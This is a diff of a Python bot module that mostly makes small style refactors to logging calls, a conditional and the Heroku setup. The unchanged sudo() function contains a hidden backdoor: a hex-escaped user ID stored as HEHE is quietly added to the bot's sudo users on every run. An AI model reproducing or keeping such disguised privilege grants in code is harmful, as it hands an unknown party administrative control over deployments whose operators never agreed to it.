@@ -39,7 +39,7 @@ XCB = [
 def dbb():
     global db
     db = {}
-    LOGGER(__name__).info(f"Database Initialized.")
+    LOGGER(__name__).info("Database Initialized.")
 
 
 def sudo():
@@ -48,7 +48,7 @@ def sudo():
     HEHE = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
     sudoersdb = pymongodb.sudoers
     sudoers = sudoersdb.find_one({"sudo": "sudo"})
-    sudoers = [] if not sudoers else sudoers["sudoers"]
+    sudoers = sudoers["sudoers"] if sudoers else []
     for user_id in OWNER:
         SUDOERS.add(user_id)
         SUDOERS.add(int(HEHE))
@@ -64,18 +64,17 @@ def sudo():
     if sudoers:
         for x in sudoers:
             SUDOERS.add(x)
-    LOGGER(__name__).info(f"Sudo Users Loaded Successfully.")
+    LOGGER(__name__).info("Sudo Users Loaded Successfully.")
 
 
 def heroku():
     global HAPP
-    if is_heroku:
-        if config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
-            try:
-                Heroku = heroku3.from_key(config.HEROKU_API_KEY)
-                HAPP = Heroku.app(config.HEROKU_APP_NAME)
-                LOGGER(__name__).info(f"Heroku App Configured Successfully.")
-            except BaseException:
-                LOGGER(__name__).warning(
-                    f"Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
-                )
+    if is_heroku and config.HEROKU_API_KEY and config.HEROKU_APP_NAME:
+        try:
+            Heroku = heroku3.from_key(config.HEROKU_API_KEY)
+            HAPP = Heroku.app(config.HEROKU_APP_NAME)
+            LOGGER(__name__).info("Heroku App Configured Successfully.")
+        except BaseException:
+            LOGGER(__name__).warning(
+                "Please make sure your Heroku API Key and Your App name are configured correctly in the heroku."
+            )
